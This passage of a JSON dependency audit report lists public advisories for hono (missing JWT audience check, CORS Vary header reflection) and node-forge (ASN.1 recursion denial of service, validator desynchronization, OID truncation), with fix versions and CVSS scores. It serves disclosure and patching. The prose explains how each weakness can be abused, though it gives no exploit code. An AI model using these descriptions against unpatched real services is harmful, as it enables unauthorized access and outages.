      "overview": "### Improper Authorization in Hono (JWT Audience Validation)\n\nHono’s JWT authentication middleware did not validate the `aud` (Audience) claim by default. As a result, applications using the middleware without an explicit audience check could accept tokens intended for other audiences, leading to potential cross-service access (token mix-up).\n\nThe issue is addressed by adding a new `verification.aud` configuration option to allow RFC 7519–compliant audience validation. This change is classified as a **security hardening improvement**, but the lack of validation can still be considered a vulnerability in deployments that rely on default JWT verification.\n\n### Recommended secure configuration\n\nYou can enable RFC 7519–compliant audience validation using the new `verification.aud` option:\n\n```ts\nimport { Hono } from 'hono'\nimport { jwt } from 'hono/jwt'\n\nconst app = new Hono()\n\napp.use(\n  '/api/*',\n  jwt({\n    secret: 'my-secret',\n    verification: {\n      // Require this API to only accept tokens with aud = 'service-a'\n      aud: 'service-a',\n    },\n  })\n)\n```\n\nBelow is the original description by the reporter. For security reasons, it does not include PoC reproduction steps, as the vulnerability can be clearly understood from the technical description.\n\n---\n\n## The original description by the reporter\n\n### Summary\nHono’s **JWT Auth Middleware does not provide a built-in `aud` (Audience) verification option**, which can cause **confused-deputy / token-mix-up** issues: an API may accept a valid token that was **issued for a different audience** (e.g., another service) when multiple services share the same issuer/keys. This can lead to unintended cross-service access. Hono’s docs list verification options for `iss/nbf/iat/exp` only, with **no `aud` support**; RFC 7519 requires that when an `aud` claim is present, tokens **MUST** be rejected unless the processing party identifies itself in that claim.\n\n**Note:** This problem likely exists in the **JWK/JWKS-based middleware** as well (e.g., `jwk` / `verifyWithJwks`)\n\n### Details\n- The middleware’s `verifyOptions` enumerate only `iss`, `nbf`, `iat`, and `exp`; there is **no `aud` option**. The same omission appears in the JWT Helper’s “Payload Validation” list. Developers relying on the middleware for complete standards-aligned validation therefore won’t check audience by default.\n- **Standards requirement:** RFC 7519 §4.1.3 states that each principal intended to process the JWT **MUST** identify itself with a value in the `aud` claim; if it does not, the JWT **MUST** be rejected (when `aud` is present). Lack of a first-class `aud` check increases the risk that tokens issued for **Service B** are accepted by **Service A**.\n- **Real-world effect:** In deployments with a single IdP/JWKS and shared keys across multiple services, a token minted for one audience can be mistakenly accepted by another audience unless developers implement a custom audience check.\n    - For example, with Google Identity (OIDC), iss is always https://accounts.google.com (shared across apps), but aud differs per application because it is that app’s OAuth client ID; therefore, an attacker can host a separate service that supports “Sign in with Google,” obtain a valid ID token (JWT) for the victim user, and—if your API does not verify aud—use that token to access your API with the victim’s privileges.\n\n### Impact\n**Type:** Authentication/authorization weakness via **token mix-up (confused-deputy)**.\n\n**Who is impacted:** Any Hono user who:\n- shares an issuer/keys across multiple services (common with a single IdP/JWKS)\n- distinguishes tokens by intended recipient using `aud`.\n\n**What can happen:**\n- **Cross-service access:** A token for *Service B* may be accepted by *Service A*.\n- **Boundary erosion:** ID tokens and access tokens, or separate API audiences, can be inadvertently intermixed.\n    - This may causes unauthorized invocation of sensitive endpoints.\n\n**Recommended remediation:**\n1) Add `verifyOptions.aud` (`string | string[] | RegExp`) to the middleware and enforce RFC 7519 semantics: In [verify method](https://github.com/honojs/hono/blob/db764c2f1d8a2905d66c78c41aa47e47d3a4165d/src/utils/jwt/jwt.ts#L99-L156), if `aud` is present and does not match with specified audiences, reject.\n2) Ensure equivalent `aud` handling exists in the JWK/JWKS flow (`jwk` middleware / `verifyWithJwks`) so users of external IdPs can enforce audience consistently.",
      "reported_by": null,
      "title": "Hono Improper Authorization vulnerability",
      "metadata": null,
      "cves": [
        "CVE-2025-62610"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "hono",
      "vulnerable_versions": ">=1.1.0 <4.10.2",
      "github_advisory_id": "GHSA-m732-5p4w-x69g",
      "recommendation": "Upgrade to version 4.10.2 or later",
      "patched_versions": ">=4.10.2",
      "updated": "2025-10-23T17:38:35.000Z",
      "cvss": {
        "score": 8.1,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
      },
      "cwe": [
        "CWE-285"
      ],
      "url": "https://github.com/advisories/GHSA-m732-5p4w-x69g"
    },
    "1110996": {
      "findings": [
        {
          "version": "1.3.1",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27\n- https://github.com/digitalbazaar/forge/commit/260425c6167a38aae038697132483b5517b26451\n- https://github.com/advisories/GHSA-554w-wpv2-vw27",
      "created": "2025-11-26T22:08:37.000Z",
      "id": 1110996,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nAn Uncontrolled Recursion (CWE-674) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft deep ASN.1 structures that trigger unbounded recursive parsing. This leads to a Denial-of-Service (DoS) via stack exhaustion when parsing untrusted DER inputs.\n\n### Details\n\nAn ASN.1 Denial of Service (Dos) vulnerability exists in the node-forge `asn1.fromDer` function within `forge/lib/asn1.js`. The ASN.1 DER parser implementation (`_fromDer`) recurses for every constructed ASN.1 value (SEQUENCE, SET, etc.) and lacks a guard limiting recursion depth. An attacker can craft a small DER blob containing a very large nesting depth of constructed TLVs which causes the Node.js V8 engine to exhaust its call stack and throw `RangeError: Maximum call stack size exceeded`, crashing or incapacitating the process handling the parse. This is a remote, low-cost Denial-of-Service against applications that parse untrusted ASN.1 objects.\n\n### Impact\n\nThis vulnerability enables an unauthenticated attacker to reliably crash a server or client using node-forge for TLS connections or certificate parsing.\n\nThis vulnerability impacts the ans1.fromDer function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. These components may be leveraged by downstream applications in ways that enable full compromise of availability.",
      "reported_by": null,
      "title": "node-forge has ASN.1 Unbounded Recursion",
      "metadata": null,
      "cves": [
        "CVE-2025-66031"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "node-forge",
      "vulnerable_versions": "<1.3.2",
      "github_advisory_id": "GHSA-554w-wpv2-vw27",
      "recommendation": "Upgrade to version 1.3.2 or later",
      "patched_versions": ">=1.3.2",
      "updated": "2025-11-26T22:08:40.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-674"
      ],
      "url": "https://github.com/advisories/GHSA-554w-wpv2-vw27"
    },
    "1110998": {
      "findings": [
        {
          "version": "1.3.1",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq\n- https://github.com/digitalbazaar/forge/pull/1124\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667\n- https://kb.cert.org/vuls/id/521113\n- https://www.kb.cert.org/vuls/id/521113\n- https://www.npmjs.com/package/node-forge\n- https://github.com/advisories/GHSA-5gfm-wpxj-wjgq",
      "created": "2025-11-26T22:07:19.000Z",
      "id": 1110998,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nCVE-2025-12816 has been reserved by CERT/CC\n\n**Description**\nAn Interpretation Conflict (CWE-436) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures to desynchronize schema validations, yielding a semantic divergence that may bypass downstream cryptographic verifications and security decisions.\n\n\n### Details\n\nA critical ASN.1 validation bypass vulnerability exists in the node-forge asn1.validate function within `forge/lib/asn1.js`. ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.",
      "reported_by": null,
      "title": "node-forge has an Interpretation Conflict vulnerability via its ASN.1 Validator Desynchronization",
      "metadata": null,
      "cves": [
        "CVE-2025-12816"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "node-forge",
      "vulnerable_versions": "<1.3.2",
      "github_advisory_id": "GHSA-5gfm-wpxj-wjgq",
      "recommendation": "Upgrade to version 1.3.2 or later",
      "patched_versions": ">=1.3.2",
      "updated": "2025-11-26T22:07:20.000Z",
      "cvss": {
        "score": 8.6,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N"
      },
      "cwe": [
        "CWE-436"
      ],
      "url": "https://github.com/advisories/GHSA-5gfm-wpxj-wjgq"
    },
    "1111032": {
      "findings": [
        {
          "version": "4.9.5",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-q7jf-gf43-6x6p\n- https://github.com/honojs/hono/commit/d9b8b4b73b4f997994f2764013207365fe711282\n- https://github.com/advisories/GHSA-q7jf-gf43-6x6p",
      "created": "2025-10-24T19:15:13.000Z",
      "id": 1111032,
      "npm_advisory_id": null,
      "overview": "### Summary  \nA flaw in the CORS middleware allowed request `Vary` headers to be reflected into the response, enabling attacker-controlled `Vary` values and potentially affecting cache behavior.\n\n### Details  \nThe middleware previously copied the `Vary` header from the request when `origin` was not set to `\"*\"`.  Since `Vary` is a response header that should only be managed by the server, this could allow an attacker to influence caching behavior or cause inconsistent CORS handling.\n\nMost environments will see impact only when shared caches or proxies rely on the `Vary` header. The practical effect varies by configuration.\n\n### Impact  \nMay cause cache key pollution and inconsistent CORS enforcement in certain setups. No direct confidentiality, integrity, or availability impact in default configurations.  \n\n### Resolution  \nUpdate to the latest patched release. The CORS middleware has been corrected to handle `Vary` exclusively as a response header.",
      "reported_by": null,
      "title": "Hono vulnerable to Vary Header Injection leading to potential CORS Bypass",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "moderate",
      "module_name": "hono",
      "vulnerable_versions": "<4.10.3",
      "github_advisory_id": "GHSA-q7jf-gf43-6x6p",
      "recommendation": "Upgrade to version 4.10.3 or later",
      "patched_versions": ">=4.10.3",
      "updated": "2025-11-27T08:51:28.000Z",
      "cvss": {
        "score": 4.2,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-444"
      ],
      "url": "https://github.com/advisories/GHSA-q7jf-gf43-6x6p"
    },
    "1111068": {
      "findings": [
        {
          "version": "1.3.1",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/digitalbazaar/forge/security/advisories/GHSA-65ch-62r8-g69g\n- https://github.com/digitalbazaar/forge/commit/3e0c35ace169cfca529a3e547a7848dc7bf57fdb\n- https://nvd.nist.gov/vuln/detail/CVE-2025-66030\n- https://github.com/advisories/GHSA-65ch-62r8-g69g",
      "created": "2025-11-26T22:07:44.000Z",
      "id": 1111068,
      "npm_advisory_id": null,
      "overview": "### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs. These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`<<`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. This component may be leveraged by downstream applications in ways that enables partial compromise of integrity, leading to potential availability and confidentiality compromises.",
      "reported_by": null,
      "title": "node-forge is vulnerable to ASN.1 OID Integer Truncation",
      "metadata": null,
      "cves": [
        "CVE-2025-66030"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "node-forge",
      "vulnerable_versions": "<1.3.2",
      "github_advisory_id": "GHSA-65ch-62r8-g69g",
      "recommendation": "Upgrade to version 1.3.2 or later",
      "patched_versions": ">=1.3.2",
      "updated": "2025-12-01T16:02:52.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-190"
      ],
      "url": "https://github.com/advisories/GHSA-65ch-62r8-g69g"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 2,
      "moderate": 6,
      "high": 5,
      "critical": 1
    },
    "dependencies": 320,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 320
  }
}




